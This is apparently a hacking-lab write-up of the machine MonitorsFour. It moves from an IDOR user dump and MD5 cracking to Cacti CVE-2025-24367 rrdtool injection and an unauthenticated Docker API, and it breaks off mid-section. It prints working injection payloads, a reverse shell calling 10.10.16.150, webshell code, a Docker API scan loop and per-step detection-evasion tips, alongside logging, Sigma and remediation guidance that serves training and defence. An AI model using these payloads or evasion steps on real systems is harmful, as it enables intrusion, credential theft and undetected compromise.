# MonitorsFour

**OS:** Windows (Docker Desktop + WSL2 host) · **Difficulty:** Easy · **IP:** 10.129.9.109  
**Platform:** Windows host running Linux containers via Docker Desktop. Web exploitation phases operate against Linux containers. Docker API abuse and host filesystem access target the Windows layer. Blue team analysis reflects the active layer at each step.

---

## Summary

A custom monitoring application on port 80 exposes an unauthenticated API endpoint with a broken object-level authorisation flaw: querying `/user?token=0` returns the full user database including MD5 password hashes. The admin hash cracks to `wonderful1`. Subdomain enumeration reveals a Cacti instance. No username from the API directly authenticates to Cacti: manual reasoning about the admin user's real name (`Marcus Higgins`) yields `marcus` as the working login. Cacti 1.2.28 is vulnerable to CVE-2025-24367, an authenticated RCE via rrdtool command injection in the graph template `right_axis_label` parameter. After days of trial and error with encoding and CSRF handling, a staged two-step payload writes a PHP webshell and executes a reverse shell, landing in a Linux container as `www-data`. The container runs on Docker Desktop for Windows: the Docker daemon API is exposed unauthenticated on the WSL2 bridge network at `192.168.65.7:2375`. A new Alpine container is spawned with the Windows host `C:\` drive mounted, and the root flag is read directly from the Windows host filesystem.

---

## Methodology Notes

**What was new or unusual:**
CVE-2025-24367 exploits an injection point in Cacti's graph template editor that passes the `right_axis_label` parameter to rrdtool: a round-robin database utility: which has a command syntax that allows embedding arbitrary strings including PHP code into files it creates. The fact that rrdtool writes a PHP file that the web server then serves and executes is the core of the technique. Understanding this mechanism: rather than blindly running someone else's PoC: was the only way to debug the encoding and CSRF issues that caused days of failures. The Docker Desktop WSL2 bridge network exposure is an increasingly relevant real-world finding. Docker Desktop on Windows creates a host-only network (`192.168.65.0/24`) and by default exposes the Docker daemon API on that interface without TLS or authentication, which is a critical misconfiguration in any environment where containers can reach the host network.

**Mistakes made and corrections:**
Subdomain enumeration was skipped in the initial recon: the Cacti instance on `cacti.monitorsfour.htb` was discovered late, wasting significant time testing the main application only. Automated tools (hydra, ffuf) failed to handle the Cacti CSRF token correctly and produced unreliable results: days were spent trying to automate credential spraying before manually reasoning that the admin account username was `marcus` based on the full name `Marcus Higgins` from the IDOR response. Reverse shell delivery via the rrdtool injection was blocked by character encoding issues: Burp's URL encoding broke the payload in subtle ways. CyberChef's URL encode function produced correct encoding where Burp's repeater did not. Additionally, several hours were lost attempting WinRM (`evil-winrm`) and RDP access with `marcus:wonderful1` before confirming that the shell was inside a Linux container, not on the Windows host directly.

**What would be done differently:**
Virtual host and subdomain enumeration is now a mandatory parallel step alongside directory brute-forcing immediately after port scan: not an afterthought. When an API returns full user objects, every field should be tested: the `name` field here was the key to the correct username when all standard username formats failed. When automated credential tools fail against CSRF-protected forms, manual testing based on logical username derivation is faster and more reliable than spending days debugging tool configurations. For any injection that writes files, verify file creation before attempting code execution: a simple `<?=phpinfo();?>` probe before any shell attempt would have saved hours.

---

## Recon

### Port Scan : MITRE: T1046: Network Service Scanning

Full-range SYN scan maps the complete listening surface. Two ports confirmed: HTTP on 80 and WinRM on 5985. Port 5985 running `Microsoft HTTPAPI httpd 2.0` is Windows Remote Management: a standard Windows remote administration service. Its presence indicates a Windows host underneath the Linux container environment discovered later. At this stage the presence of WinRM suggests potential for lateral movement via `evil-winrm` if valid credentials for a Windows account are recovered: a path that was attempted unsuccessfully before the container context was confirmed.

```
nmap -p- -T4 -Pn --min-rate 5000 10.129.9.109
nmap -p80,5985 -sCV 10.129.9.109
```

```
80/tcp    open  http    nginx
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Logs Generated:**
1. Windows Security Event Log: Event ID 4625 may record failed connection attempts to WinRM on 5985 if connection reaches the authentication layer, which a SYN scan does not.
2. IIS or HTTPAPI access logs on the Windows host if request logging is enabled for the WinRM listener: SYN-only scan does not reach the application layer.
3. nginx access log inside the Linux container for any HTTP probes reaching port 80.
4. Windows Firewall log at `%SystemRoot%\System32\LogFiles\Firewall\pfirewall.log` if logging is enabled: records inbound connection attempts including those that are dropped.

**Alerts Triggered:**
1. No Windows Firewall alert by default: firewall logging is disabled unless explicitly configured.
2. Windows Defender or an endpoint security product monitoring inbound port scan rates would alert on the SYN flood volume from a single external IP.
3. Snort/Suricata at the network perimeter with scan detection rules fire on the SYN rate and the nmap NSE user-agent reaching port 80.

**Network Artifacts:**
1. High-volume TCP SYN packets across all 65535 ports from a single source IP in a compressed window.
2. nmap NSE user-agent in nginx container access log from service detection probes against port 80.

**Artifacts Left:**
1. nmap NSE user-agent in nginx access log inside the container.
2. Windows Firewall log entries if firewall logging is configured.

**Sysmon / EDR:**
1. On the Windows host: Sysmon Event ID 3 (Network Connection) would not fire from an inbound SYN scan: Sysmon logs outbound connections initiated by local processes, not inbound connection attempts.
2. A Windows EDR agent with inbound connection anomaly detection would log the scan event and correlate source IP with the SYN rate.

**SIEM Correlation (Windows):**
```
index=windows source="WinEventLog:Security" EventCode=4625 | stats count by src_ip | where count > 100
```
```
index=network sourcetype=firewall_logs | stats dc(dest_port) as ports_scanned by src_ip | where ports_scanned > 1000
```

**Sigma Rule:**
1. [proc_creation_win_susp_nmap.yml](https://github.com/SigmaHQ/sigma/search?q=nmap+windows): detects nmap execution on the scanning host. Network-side detection requires firewall or IDS log sources on the target.

**Bypass:**
1. `-T1` or `-T2` reduces packet rate below threshold-based IDS detection rules at the cost of scan duration.
2. `-D RND:5` distributes SYN packets across decoy source IPs, defeating per-IP SIEM aggregation.
3. Replace the NSE user-agent via `--script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"` to blend into expected Windows browser traffic in nginx logs.

**Remediation:**
1. Restrict port 5985 WinRM access to management network ranges: WinRM should never be exposed to arbitrary internet sources.
2. Enable Windows Firewall logging and forward to a SIEM.
3. Deploy Windows Defender Firewall inbound rules blocking all traffic except explicitly permitted sources for administrative ports.

**OpSec Rating:** Loud: high-rate full-range SYN sweep is one of the most recognisable traffic signatures in network security monitoring.

---

### Web Enumeration: Main Application : MITRE: T1083: File and Directory Discovery

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://monitorsfour.htb/FUZZ -ac
```

Two endpoints identified: `/auth` and `/user`. The `/user` endpoint accepts a `token` parameter: querying `token=0` returns the full user database without authentication.

**Logs Generated:**
1. Every ffuf request in nginx container access log with default ffuf user-agent.
2. High 404 volume from a single IP: thousands of entries in seconds.

**Alerts Triggered:**
1. ModSecurity with OWASP CRS would detect the scan pattern based on request rate and anomaly scoring.
2. No native nginx alert: logs accumulate without automated notification.

**Network Artifacts:**
1. Sequential HTTP GET requests from a single source IP following wordlist order.
2. Consistent ffuf user-agent across all requests, absent standard browser headers.

**Artifacts Left:**
1. ffuf user-agent string throughout nginx access log.

**Sysmon / EDR:**
1. Web application scanning is network-layer activity: no process spawned on the target. No EDR process tree artifact on the Windows host.

**SIEM Correlation (Windows):**
```
index=web sourcetype=nginx_access status=404 | stats count by clientip | where count > 200 | sort -count
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects known scanner user-agent strings in web access logs.

**Bypass:**
1. Replace the ffuf user-agent with a browser string.
2. Reduce rate and add delay to defeat rate-based correlation.

**Remediation:**
1. The `/user` endpoint requires authentication and authorisation controls: unauthenticated API access to user data is a critical OWASP A01 finding.
2. Deploy ModSecurity with OWASP CRS in blocking mode on the nginx instance.

**OpSec Rating:** Moderate: scanner user-agent and 404 volume are detectable but less immediately actionable without content analysis tooling.

---

### Subdomain Enumeration : MITRE: T1595.003: Active Scanning: Wordlist Scanning

Virtual host enumeration is a mandatory step after confirming a web server. Skipping this in the initial recon phase was the primary mistake on this machine: the Cacti instance on `cacti.monitorsfour.htb` was the actual attack surface and was invisible without this step. Apache and nginx both support name-based virtual hosting: the same IP and port serve entirely different applications depending on the HTTP `Host` header value.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ac
```

```
cacti.monitorsfour.htb   [Status: 200]
```

Added to `/etc/hosts`:
```
10.129.9.109 monitorsfour.htb cacti.monitorsfour.htb
```

**Logs Generated:**
1. Every request in nginx container access log with varying `Host` header values: recognisable virtual host fuzzing pattern.
2. Responses for unrecognised virtual hosts differ from valid ones: distinguishable in content-length analysis.

**Alerts Triggered:**
1. No native nginx alert.
2. A WAF or rate-limiting rule fires on the request volume and `Host` header variation pattern.

**Network Artifacts:**
1. High volume of HTTP GET requests from a single IP with sequentially varying `Host` header values.
2. Content-length differences identifying the valid virtual host visible in traffic analysis.

**Artifacts Left:**
1. ffuf user-agent and full request volume in nginx access log.

**Sysmon / EDR:**
1. Network-layer activity: no process spawned on the target host.

**SIEM Correlation (Windows):**
```
index=web sourcetype=nginx_access | stats dc(http_host) as hosts_tried by clientip | where hosts_tried > 50
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=virtual+host+scan): detects anomalous `Host` header variation patterns in web access logs.

**Bypass:**
1. Passive DNS enumeration via certificate transparency logs (`crt.sh`, `censys.io`) achieves the same subdomain discovery without generating any access log entries on the target: zero detection footprint.
2. Replace ffuf user-agent with a browser string to remove the scanner signature.

**Remediation:**
1. Return identical responses for all unrecognised `Host` header values: do not differentiate between valid and invalid virtual hosts in the response.

**OpSec Rating:** Moderate: virtual host fuzzing generates a distinct access log pattern but requires content analysis tooling to detect reliably.

---

## Foothold

### IDOR: Unauthenticated User Data Exposure : MITRE: T1087: Account Discovery · T1552.001: Credentials in Files

Insecure Direct Object Reference occurs when an API endpoint uses a user-controlled parameter to reference database objects without verifying the caller has permission to access them. The `/user` endpoint accepts a `token` parameter: querying `token=0` returns all user records. This is not a boundary case or an edge condition: the application returns the entire user table including plaintext-comparable credential hashes, salary information, and role assignments to any unauthenticated caller. The `token=0` value likely bypasses an intended token-matching lookup by matching no specific user, triggering a full-table return. This single request exposes the full credential set for every application account without authentication, without rate limiting, and without logging in most default configurations.

```
curl -s "http://monitorsfour.htb/user?token=0" | jq
```

```json
{"id":2,"username":"admin","name":"Marcus Higgins","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f"}
{"id":5,"username":"mwatson","name":"Michael Watson","password":"69196959c16b26ef00b77d82cf6eb169","role":"user"}
{"id":6,"username":"janderson","name":"Jennifer Anderson","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user"}
{"id":7,"username":"dthompson","name":"David Thompson","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user"}
```

**Logs Generated:**
1. Single HTTP GET request in nginx container access log: appears as one normal API query, indistinguishable in the log from a legitimate authenticated call.
2. No authentication event: the endpoint accepts the request without any credential validation.

**Alerts Triggered:**
1. No alert in any default configuration: this is a single well-formed HTTP GET request.
2. A WAF with sensitive data exposure rules would flag a response containing multiple password hash fields.
3. A SIEM with data exfiltration volume rules would not fire on a single small response.

**Network Artifacts:**
1. One HTTP GET request to `/user?token=0`: the response contains all user credential hashes in plaintext JSON.
2. Response content visible in PCAP: all hashes, names, emails, roles, and tokens readable by any network observer.

**Artifacts Left:**
1. Single GET request in nginx access log with `token=0` parameter.
2. The response was served: no file written on the target.

**Sysmon / EDR:**
1. Web application API call: no process spawned on the target. No EDR artifact.

**SIEM Correlation (Windows):**
```
index=web sourcetype=nginx_access uri="/user" | search "token=0" | stats count by clientip
```
Any request to `/user?token=0` should be treated as a critical security event given what it returns.

**Sigma Rule:**
1. No specific Sigma rule for IDOR exploitation exists: it is a syntactically valid HTTP request. Detection requires response content inspection or anomaly detection on API parameter values.

**Bypass:**
1. No bypass required: the endpoint is unauthenticated and returns the data unconditionally.

**Remediation:**
1. Implement authentication on the `/user` endpoint: all user data endpoints must require a valid session token verified server-side.
2. Implement object-level authorisation: even authenticated users should only retrieve their own record unless explicitly granted admin privileges.
3. Remove password hashes from API responses entirely: the `/user` endpoint has no legitimate use case for returning credential hashes.
4. Rate-limit API endpoints to prevent bulk data retrieval even if authentication is added.

**OpSec Rating:** Silent: one well-formed GET request to a public API endpoint generates a single access log entry indistinguishable from legitimate API use.

---

### MD5 Hash Cracking : MITRE: T1110.002: Brute Force: Password Cracking

MD5 is a general-purpose cryptographic hash function that was never designed for password storage. It produces a fixed 32-character hexadecimal digest in microseconds per hash: a modern GPU can evaluate tens of billions of MD5 hashes per second. Without a unique per-user salt, identical passwords produce identical hashes across all users, and precomputed rainbow tables make reversal of common passwords nearly instantaneous. The four hashes recovered from the IDOR are unsalted MD5, making this the weakest possible password storage implementation. The `admin` account hash `56b32eb43e6f15395f6c46c1c9e1cd36` cracks to `wonderful1`: a password that appears in rockyou.txt.

```
hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
```

```
56b32eb43e6f15395f6c46c1c9e1cd36 : wonderful1
```

**Logs Generated:**
1. None on the target: entirely offline computation.

**Alerts Triggered:**
1. None: offline cracking generates zero network traffic to the target.

**Network Artifacts:**
1. None.

**Artifacts Left:**
1. hashcat `.potfile` on the attacker machine.
2. No artifacts on the target.

**Sysmon / EDR:**
1. Not applicable to the target.

**SIEM Correlation (Windows):**
1. Not applicable: no target-side event generated.

**Sigma Rule:**
1. [proc_creation_lnx_password_cracker.yml](https://github.com/SigmaHQ/sigma/search?q=password+cracking): applicable to attacker host only.

**Bypass:**
1. Not applicable: offline cracking is definitionally invisible to the target. Unsalted MD5 provides no meaningful resistance to GPU-accelerated dictionary attacks.

**Remediation:**
1. Replace MD5 with bcrypt, scrypt, or Argon2: algorithms specifically designed for password storage with configurable computational cost.
2. Add unique per-user random salts regardless of algorithm choice.
3. The root issue is the IDOR exposing hashes in the first place: fix that and offline cracking becomes impossible.

**OpSec Rating:** Silent: zero target-side visibility.

---

### Cacti Authentication: Username Derivation : MITRE: T1078: Valid Accounts

Cacti's login form at `cacti.monitorsfour.htb` uses a CSRF token (`__csrf_magic`) that is regenerated per session. Automated credential spraying tools (hydra, ffuf) failed repeatedly because they could not handle the CSRF token lifecycle correctly: each POST requires a fresh token obtained from a prior GET request, and the tools' session management did not maintain this state reliably. Days were spent debugging automation before recognising that manual reasoning was faster and more reliable here.

The IDOR response showed the admin account's full name: `Marcus Higgins`. Every other account follows `FirstInitialLastName` format (`mwatson`, `janderson`, `dthompson`). Applying the same pattern gives `mhiggins`: which did not work. Testing the first name `marcus` directly authenticated successfully. The lesson is concrete: when automated username formats fail, test names and surnames independently. The automation found the wrong answer; the logic found the right one.

```
http://cacti.monitorsfour.htb/cacti/index.php
```

Username: `marcus` · Password: `wonderful1`: authenticated as administrator.

**Logs Generated:**
1. Login POST in Cacti's application log and in nginx access log.
2. Cacti writes authentication events to its database `user_log` table: source IP, username, timestamp, and success/failure status.
3. All failed attempts from username enumeration are also logged in `user_log`.

**Alerts Triggered:**
1. No alert on a default Cacti installation for a single successful login.
2. The volume of failed attempts from username spraying before finding `marcus` would trigger a brute-force detection rule if one were configured.

**Network Artifacts:**
1. HTTP POST to `/cacti/index.php` with credentials in the body: visible in PCAP if unencrypted.
2. Session cookie issued on success, reused in all subsequent requests.

**Artifacts Left:**
1. All authentication attempts recorded in Cacti's `user_log` database table: including every failed attempt: with source IP and timestamp.
2. Successful login entry in nginx access log.

**Sysmon / EDR:**
1. Web application authentication: no process spawned on the target. No Windows EDR process tree artifact.

**SIEM Correlation (Windows):**
```
index=web sourcetype=nginx_access uri="/cacti/index.php" method=POST | stats count by clientip | where count > 10
```
High POST volume to the login endpoint from a single IP.

**Sigma Rule:**
1. No Cacti-specific Sigma rule for authentication events. Generic web brute-force detection applies to the failed attempts preceding the successful login.

**Bypass:**
1. The CSRF token requirement makes automated spraying significantly more complex: per-request token fetching requires a stateful HTTP client. This is a genuine (if unintentional) protection against naive credential automation.
2. For manual testing, reasoning from known user data (full names from IDOR) is more efficient than exhaustive automation against a CSRF-protected form.

**Remediation:**
1. Implement account lockout after a configurable number of failed authentication attempts.
2. Log and alert on authentication failures exceeding a threshold per source IP.
3. The credential reuse between the main application database and Cacti is the core finding: each service should use independent credentials.

**OpSec Rating:** Moderate: successful login produces one access log entry indistinguishable from legitimate access. The preceding failed attempts from spraying are a high-noise signal requiring active monitoring.

---

### CVE-2025-24367: Cacti RCE via rrdtool Injection : MITRE: T1190: Exploit Public-Facing Application · CVE-2025-24367

Cacti uses rrdtool: a round-robin database and graphing utility: to create and manage time-series data files and render graphs. The graph template editor allows administrators to configure graph parameters including the `right_axis_label` field. This field is passed to rrdtool as part of a command-line argument construction without adequate sanitisation. rrdtool's command syntax supports a special prefix `XXX` that switches it into a multi-command parsing mode, allowing newline-separated commands including `create` (to create a new `.rrd` file) and `graph` (to render a graph). The `graph` command's `LINE1` definition accepts a label string that is written into the output file specified by the graph filename argument. If the output filename has a `.php` extension and the output directory is web-accessible, the label string: which can contain arbitrary PHP: is written to disk as a PHP file and becomes executable by the web server.

The injection sequence is:
1. `create my.rrd`: creates a dummy RRD database file.
2. `graph xmp.php`: renders a "graph" to `xmp.php` (in the web-accessible Cacti directory).
3. `LINE1:out:<?=\`id\`;?>`: the line label contains PHP backtick execution syntax, written verbatim into `xmp.php`.
4. Browsing `http://cacti.monitorsfour.htb/cacti/xmp.php` executes the PHP and returns command output.

The critical encoding requirement: the `right_axis_label` parameter must have newlines encoded as `%0D%0A` and the full value must be correctly URL-encoded. Burp Repeater's URL encoding produced inconsistent results. CyberChef's URL encode function produced correct output. The CSRF token must be fresh: obtained from a prior GET to `/cacti/index.php` within the same session.

Step 1: Verify execution with `id`:

```
POST /cacti/graph_templates.php HTTP/1.1
Host: cacti.monitorsfour.htb
Cookie: [valid session]
Content-Type: application/x-www-form-urlencoded

__csrf_magic=[token]&name=PING+-+Advanced+Ping&right_axis_label=%0D%0AXXX%0D%0Acreate%20my.rrd%20--step%20300%20DS:temp:GAUGE:600:-273:5000%20RRA:AVERAGE:0.5:1:1200%0D%0Agraph%20xmp.php%20-s%20now%20-a%20CSV%20DEF:out=my.rrd:temp:AVERAGE%20LINE1:out:%3C?=%60id%60;?%3E%0D%0A&[remaining params]&action=save
```

Browse `http://cacti.monitorsfour.htb/cacti/xmp.php`:

```
"time","uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

Step 2: Deliver reverse shell. Start listener:

```
nc -lvnp 9001
```

Write shell payload to a new PHP file:

```
right_axis_label=%0D%0AXXX%0D%0Acreate%20my.rrd%20--step%20300%20DS:temp:GAUGE:600:-273:5000%20RRA:AVERAGE:0.5:1:1200%0D%0Agraph%20z9y8.php%20-s%20now%20-a%20CSV%20DEF:out=my.rrd:temp:AVERAGE%20LINE1:out:%3C?=%60bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.16.150/9001%200%3E%261'%60;?%3E%0D%0A
```

Browse `http://cacti.monitorsfour.htb/cacti/z9y8.php`. Shell received as `www-data`.

```
script /dev/null -c bash
export TERM=xterm-256color
```

**Logs Generated:**
1. The save POST to `graph_templates.php` recorded in nginx access log: the URL-encoded rrdtool payload is present in the request body. Cacti's database records the modified graph template including the injected `right_axis_label` value.
2. rrdtool execution is logged by the Cacti application process: rrdtool spawned as a child process with the injected arguments.
3. PHP webshell files `xmp.php` and `z9y8.php` created in the Cacti web directory: file creation timestamps forensically recoverable.
4. HTTP GET requests to `xmp.php` and `z9y8.php` in nginx access log.
5. Outbound TCP connection from the `www-data` process to `10.10.16.150:9001`: visible in container network logs and Windows host network flow data.

**Alerts Triggered:**
1. A PHP file written to the Cacti web directory by the web application process is a high-confidence web shell indicator: file integrity monitoring on the web root would alert immediately.
2. Outbound TCP connection from the web application process to an external IP on port 9001 is a reverse shell indicator. Egress filtering blocking non-standard outbound ports from the container would prevent shell delivery.
3. No alert in a default configuration without FIM on the Cacti web directory or egress filtering.

**Network Artifacts:**
1. POST request to `graph_templates.php` containing rrdtool injection syntax in the body: visible in PCAP.
2. GET requests to the webshell PHP files.
3. Outbound TCP SYN from the container IP to `10.10.16.150:9001`: server-initiated outbound connection to a client IP.
4. Reverse shell session content transmitted as cleartext: commands and output visible in full PCAP.

**Artifacts Left:**
1. `xmp.php` and `z9y8.php` webshell files on disk in the Cacti web directory: persist until deleted.
2. `my.rrd` dummy database file created by rrdtool in the Cacti directory.
3. Modified graph template in the Cacti database containing the rrdtool injection payload.
4. All GET requests to the webshell files in nginx access log.

**Sysmon / EDR:**
1. Inside the Linux container: EDR would log: `php-fpm -> rrdtool` (child process spawning) and `php-fpm -> bash` (reverse shell execution). The latter is a high-severity post-exploitation indicator.
2. On the Windows host: Sysmon Event ID 3 (Network Connection) would not capture outbound connections from inside containers directly; the Docker network driver handles the NAT. Windows Defender with network protection enabled may inspect outbound connections from Docker-managed interfaces.

**SIEM Correlation (Container/Linux):**
```
index=web sourcetype=nginx_access | search "graph_templates.php" method=POST | stats count by clientip
```
```
index=network sourcetype=firewall_logs direction=outbound dest_port=9001 | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [proc_creation_lnx_web_shell.yml](https://github.com/SigmaHQ/sigma/search?q=web+shell+linux): detects creation of PHP files in web application directories by web server processes.
2. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects bash spawning with network redirection arguments.

**Bypass:**
1. Use a randomly named PHP file for each attempt to defeat filename-based FIM signatures: already done here with `xmp.php` and `z9y8.php` rather than `shell.php`.
2. Use port 443 or 80 for the reverse shell callback to blend into expected outbound HTTPS traffic.
3. Encode the reverse shell payload to avoid cleartext bash command signatures in POST body: Base64 decode at execution time: `` <?=`echo [base64]|base64 -d|bash`;?> ``
4. Delete the webshell files immediately after obtaining the reverse shell: reduces the FIM detection window.

**Remediation:**
1. Apply the Cacti vendor patch for CVE-2025-24367.
2. Sanitise all parameters passed to rrdtool: never pass unsanitised user input to external command-line utilities.
3. Deploy file integrity monitoring on the Cacti web directory: any new PHP file creation should trigger an immediate alert.
4. Implement egress filtering blocking all outbound connections from the Cacti container except to expected monitoring targets.

**OpSec Rating:** Loud: writing PHP webshell files to a web directory and receiving a reverse shell generates file system, process, and network artifacts detectable at multiple layers.

---

## Post-Exploitation: Container Context

### Container Identification : MITRE: T1082: System Information Discovery · T1016: System Network Configuration Discovery

Before attempting any privilege escalation or lateral movement, the execution context must be established. A shell hostname of `821fbd6a43fa`, an IP address in `172.18.0.0/16`, and the presence of Docker-specific mount entries in `/proc/self/mountinfo` collectively confirm operation inside a Linux container rather than directly on the Windows host. This was the point at which the WinRM and RDP attempts should have been abandoned: attempting `evil-winrm` with `marcus:wonderful1` against the host was wasted effort because the compromised credentials belonged to a Cacti application account, not a Windows domain or local account.

```
hostname
cat /proc/self/mountinfo | grep docker
ip addr
ip route
cat /etc/os-release
```

```
821fbd6a43fa
172.18.0.2/16 (container IP)
Default gateway: 172.18.0.1
OS: Debian GNU/Linux 13 (trixie)
Kernel: 6.6.87.2-microsoft-standard-WSL2
```

The `microsoft-standard-WSL2` kernel string is the critical indicator: this is Docker Desktop running on a Windows host via WSL2. The Docker Desktop bridge network creates a `192.168.65.0/24` subnet for host-container communication. The Docker daemon API, if exposed on this interface, would be reachable from within the container.

**Logs Generated:**
1. `hostname`, `ip addr`, `ip route` commands visible in `www-data` bash history.
2. `/proc/self/mountinfo` read: no log entry generated (read-only kernel filesystem access).

**Alerts Triggered:**
1. None in any default configuration.

**Network Artifacts:**
1. None: local command execution, no network traffic.

**Artifacts Left:**
1. Enumeration commands in bash history unless suppressed.

**Sysmon / EDR:**
1. Inside the container: EDR would log process creation for enumeration commands: parent chain: `sshd/nginx -> php-fpm -> bash -> hostname/ip/cat`.

**SIEM Correlation (Windows):**
1. Not applicable at this step: activity is inside the container and not visible to Windows host logging without container-level monitoring integration.

**Sigma Rule:**
1. [proc_creation_lnx_network_enumeration.yml](https://github.com/SigmaHQ/sigma/search?q=network+enumeration+linux): detects `ip`, `hostname`, and related system enumeration commands within remotely initiated shell sessions.

**Bypass:**
1. Read `/proc/net/tcp` and network configuration directly rather than invoking named tools: avoids process-name-based detection rules targeting `ip` and `hostname` specifically.

**Remediation:**
1. Post-compromise enumeration is a detection indicator, not a preventable action once shell access exists. The remediation is preventing shell access in the first place.

**OpSec Rating:** Silent: standard system commands executed by `www-data` within a container generate no alert in any default monitoring configuration.

---

### Database Enumeration: Cacti MariaDB : MITRE: T1005: Data from Local System

```
cat /var/www/html/cacti/include/config.php
```

```
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
```

```
mysql -h mariadb -u cactidbuser -p'7pyrf6ly8qx4' -P 3306 -D cacti -e "SELECT username,password FROM user_auth;"
```

```
admin  : $2y$10$wqlo06C4isr4q9xhqI/UQOpyM/n8EDzYl/GndqhDh/2LQihzPdHWO
marcus : $2y$10$bPWlnZYLhoDUawu4x8vLAuCIaDbqIUe4s9t9HqFm/1gtbavD/eKGe
```

Both are bcrypt (`$2y$10$`). Neither cracked against rockyou. The `marcus` account's password was already known from the main application IDOR (`wonderful1`): the Cacti database provided no new credential material. At this point, lateral movement must come from the container environment rather than from credentials.

**Logs Generated:**
1. `cat config.php`: file access timestamp updated on `config.php`.
2. MySQL connection from `172.18.0.2` to `mariadb` container: visible in MariaDB general query log if enabled.
3. `SELECT` query on `user_auth`: recorded in MariaDB general query log if enabled (disabled by default).

**Alerts Triggered:**
1. No alert in a default configuration.
2. A DLP or database activity monitoring tool watching for `SELECT *` from credential tables would flag this.

**Network Artifacts:**
1. MySQL protocol traffic from `172.18.0.2` to the `mariadb` container on port 3306: visible in container network traffic capture.

**Artifacts Left:**
1. `cat config.php` in bash history.
2. `mysql` command with credentials visible in bash history and process arguments unless suppressed.
3. File access timestamp on `config.php`.

**Sysmon / EDR:**
1. Inside the container: EDR logs `mysql` process creation with full argument list including `-p'7pyrf6ly8qx4'`: credentials visible in process arguments.

**SIEM Correlation (Windows):**
1. Not applicable at this step: container-internal database query not visible to Windows host logging.

**Sigma Rule:**
1. [proc_creation_lnx_mysql_credentials_in_cmdline.yml](https://github.com/SigmaHQ/sigma/search?q=mysql+password+commandline): detects MySQL connections with plaintext passwords in command-line arguments.

**Bypass:**
1. Use a MySQL options file (`~/.my.cnf`) to store credentials rather than passing `-p` on the command line: prevents credentials from appearing in process argument lists visible to EDR and bash history.

**Remediation:**
1. Restrict `cactidbuser` to SELECT privileges only on required tables: no ability to query `user_auth` directly.
2. Store database credentials in environment variables or a secrets manager rather than in a plaintext PHP config file.

**OpSec Rating:** Silent: web application process reading its own config file and connecting to its own database generates no alert in any default configuration.

---

## Privilege Escalation

### Docker API Discovery: WSL2 Bridge Network : MITRE: T1046: Network Service Discovery · T1613: Container and Resource Discovery

Docker Desktop for Windows creates a dedicated bridge network (`192.168.65.0/24`) for communication between the Windows host and its containers. The special DNS name `host.docker.internal` resolves from within containers to an address in this subnet: specifically the Docker Desktop gateway. The Docker Engine daemon API, if configured to listen on an unprotected TCP socket, is accessible on this interface. The default Docker Desktop installation in development or evaluation environments frequently exposes the Docker daemon API on port 2375 without TLS or authentication: a critical misconfiguration that provides complete control over the Docker environment to any process that can reach the socket.

Confirming `host.docker.internal` resolution and then scanning the `192.168.65.0/24` range for port 2375 identifies the exposed API. The brute-force loop completes in seconds due to the small subnet size.

```
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
```

```
192.168.65.7:2375 OPEN
```

```
curl http://192.168.65.7:2375/version
```

```json
{"Platform":{"Name":"Docker Engine - Community"},"Version":"28.3.2","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2"}
```

Docker daemon confirmed unauthenticated. Available images:

```
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

```
docker_setup-nginx-php:latest
docker_setup-mariadb:latest
alpine:latest
```

**Logs Generated:**
1. The curl loop generating 254 connection attempts to `192.168.65.1` through `192.168.65.254` on port 2375: each attempt is a TCP connection, not reaching the Docker API for non-listening addresses (connection refused or timeout).
2. The successful connection to `192.168.65.7:2375/version`: recorded in Docker daemon access logs on the Windows host if Docker daemon logging is enabled.
3. On Windows: Docker Desktop logs are written to `%LOCALAPPDATA%\Docker\log\vm\dockerd.log`: API requests may be logged there depending on verbosity configuration.

**Alerts Triggered:**
1. No alert in a default Docker Desktop installation: the API is exposed and unauthenticated by design in the default development configuration.
2. Windows Defender Firewall does not block connections from WSL2 containers to the `192.168.65.0/24` bridge interface by default.
3. A network monitoring tool on the Windows host watching for unexpected API calls to the Docker daemon would flag the `/version` and `/images/json` requests.

**Network Artifacts:**
1. 254 TCP connection attempts from `172.18.0.2` to `192.168.65.1`: `192.168.65.254` on port 2375 in rapid succession: visible in Windows host network capture.
2. Successful HTTP GET requests to `192.168.65.7:2375/version` and `/images/json`.

**Artifacts Left:**
1. `curl` loop and API query commands in `www-data` bash history.
2. Docker daemon access log entries on the Windows host for API requests received.

**Sysmon / EDR (Windows):**
1. Sysmon Event ID 3 (Network Connection) may capture outbound connections from WSL2 processes to the Docker Desktop bridge network, depending on Sysmon configuration for WSL2 network interfaces.
2. Windows Defender with network protection monitors connections from all processes including WSL2-hosted containers in some configurations: I have not verified this specific behaviour against Docker Desktop and cannot confirm the exact visibility.

**SIEM Correlation (Windows):**
```
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 | search dest_ip="192.168.65.7" dest_port=2375 | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [lnx_container_escape_docker_api.yml](https://github.com/SigmaHQ/sigma/search?q=docker+api+escape): detects access to the Docker daemon API from unexpected source contexts, particularly from within running containers.

**Bypass:**
